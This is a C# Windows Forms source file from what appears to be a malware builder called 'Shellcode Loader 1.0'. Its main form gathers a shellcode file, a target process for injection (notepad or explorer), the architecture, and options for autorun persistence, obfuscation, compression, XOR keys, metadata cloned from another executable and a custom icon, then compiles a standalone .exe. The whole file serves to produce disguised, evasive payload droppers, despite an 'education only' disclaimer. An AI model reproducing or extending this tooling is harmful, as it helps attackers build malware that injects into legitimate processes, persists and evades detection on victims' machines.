using Builder.Core;
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Windows.Forms;

namespace Builder
{
    public partial class CMain : Form
    {
        // Form Params
        private bool isDragging = false;
        private Point lastCursor;
        private Point lastForm;
        private string AssemblyFile, IconFile;
        private Color borderColor = Color.Pink;
        private int borderThickness = 5;
        // End

        public CMain()
        {
            InitializeComponent();
        }

        #region Main Events
        private void button1_Click(object sender, EventArgs e)
        {
            string
                injectProc = ProcessInjectCmb.Text,
                shcdFile = ShellcodeFile.Text;

            bool
                UseAutorun = AutorunChk.Checked,
                UseCompress = CompressChk.Checked,
                UseObfus = UseObfuscate.Checked,
                x86bit = arch86.Checked,
                x64bit = arch64.Checked;

            if (!File.Exists(shcdFile) || string.IsNullOrEmpty(shcdFile) || !(x86bit || x64bit) || string.IsNullOrEmpty(injectProc))
            {
                MessageBox.Show("Fields cannot be empty!", "Builder Informer", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (injectProc != "notepad" && injectProc != "explorer")
            {
                MessageBox.Show($"Please select process to inject in menu box!", "Builder Informer", MessageBoxButtons.OK, MessageBoxIcon.Warning); 
                return;
            }

            if (Helper.IsCorrectShellcode(shcdFile))
            {
                MessageBox.Show($"Please select file with correct shellcode!", "Builder Informer", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            if (UseCompress && !x64bit)
            {
                MessageBox.Show($"Support only x64", "Builder Informer", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            using (SaveFileDialog save = new SaveFileDialog())
            {
                save.Title = "Save compiled file";
                save.Filter = "*.EXE (*.exe)|*.exe";

                if (save.ShowDialog() == DialogResult.OK)
                {
                    string result = Compilator.PerformCompilate(shcdFile, save.FileName, x64bit, x86bit, IconFile, AssemblyFile, UseObfus, UseAutorun, UseCompress, injectProc);
                    MessageBox.Show(result, "Compile Result", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }
        #endregion

        #region Form Icon & Assembly Selectors
        private void AssembyCloneBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select any executable file to clone assembly";
                open.Filter = "*.EXE (*.exe)|*.exe";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    if (File.Exists(open.FileName) && open.FileName.Length != 0)
                    {
                        AssemblyFile = Path.Combine(Path.GetTempPath(), $"{Guid.NewGuid()}.META");
                        Helper.AssemblyClone(open.FileName, AssemblyFile);
                    }
                }
            }
        }

        private void SelectIconBtn_Click(object sender, EventArgs e)
        {
            string iconsDirectory = Path.Combine(Directory.GetCurrentDirectory(), "Icons");
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Select .ico file";
                open.Filter = "ICO (*.ico)|*.ico";

                if (Directory.Exists(iconsDirectory))
                {
                    open.InitialDirectory = iconsDirectory;
                }

                if (open.ShowDialog() == DialogResult.OK)
                {
                    IconFile = open.FileName;
                    IconBox.Image = Image.FromFile(open.FileName);
                }
            }
        }

        private void ResetBtn_Click(object sender, EventArgs e)
        {
            if (ShellcodeFile.Text != null)
            {
                ShellcodeFile.Clear();
            }
            
            if (AssemblyFile != null)
            {
                AssemblyFile = null;
            }
            
            if (IconBox != null && IconBox.Image != null)
            {
                IconFile = null; IconBox.Image = null;
            }
        }
        private void AboutShowBtn_Click(object sender, EventArgs e)
        {
            MessageBox.Show(
            "Warning!\nWhen you create a payload using your own shellcode variation, " +
            "remember that you need to choose the same architecture when compiling as your payload" +
            "Support Regex-pattern to parse bytes: { 0x**, 0x** -> <PAYLOAD-BYTES> }", "Algorithm About",
                MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }
        private void AboutBtn_Click(object sender, EventArgs e)
        {
            MessageBox.Show(
                "Shellcode Loader 1.0\nAuthor:K3rnel-Dev\n" +
                "Github: github.com/k3rnel-dev\n" +
                "Only for education and purposes only!", "Software About",
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        #endregion

        #region Form Settings
        private void GenerateInit_Tick(object sender, EventArgs e)
        {
            XorKeys.Text = Helper.GenerateStrBytes(32);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void MinimazeBtn_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = true;
                lastCursor = Cursor.Position;
                lastForm = Location;
            }
        }

        private void Form1_MouseMove(object sender, MouseEventArgs e)
        {
            if (isDragging)
            {
                int deltaX = Cursor.Position.X - lastCursor.X;
                int deltaY = Cursor.Position.Y - lastCursor.Y;
                Location = new Point(lastForm.X + deltaX, lastForm.Y + deltaY);
            }
        }

        private void Form1_MouseUp(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                isDragging = false;
            }
        }

        private void SelectFileBtn_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog open = new OpenFileDialog())
            {
                open.Title = "Open file with shellcode";

                if (open.ShowDialog() == DialogResult.OK)
                {
                    ShellcodeFile.Text = open.FileName;
                }
            }
        }

        private void ShellcodeFile_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                e.Effect = DragDropEffects.Copy;
            }
            else
            {
                e.Effect = DragDropEffects.None;
            }
        }


        private void ShellcodeFile_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);

                if (files.Length > 0)
                {
                    string filePath = files[0];
                    string fileExtension = Path.GetExtension(filePath);
                    ShellcodeFile.Text = filePath;
                }
            }
        }

        #endregion

        #region Form Load
        private GraphicsPath CreateRoundedRectanglePath(int width, int height, int radius)
        {
            GraphicsPath path = new GraphicsPath();
            path.AddArc(0, 0, radius, radius, 180, 90);
            path.AddArc(width - radius, 0, radius, radius, 270, 90);
            path.AddArc(width - radius, height - radius, radius, radius, 0, 90);
            path.AddArc(0, height - radius, radius, radius, 90, 90);

            path.CloseFigure();

            return path;
        }

        protected override void OnPaint(PaintEventArgs e)
        {
            base.OnPaint(e);

            Graphics g = e.Graphics;
            g.SmoothingMode = SmoothingMode.AntiAlias;

            using (Pen pen = new Pen(borderColor, borderThickness))
            {
                g.DrawPath(pen, CreateRoundedRectanglePath(this.ClientSize.Width, this.ClientSize.Height, 30));
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Padding = new Padding(borderThickness);
            int CornerRadius = 30;
            GraphicsPath path = CreateRoundedRectanglePath(Width, Height, CornerRadius);
            Region = new Region(path);
        }

        #endregion
    }
}
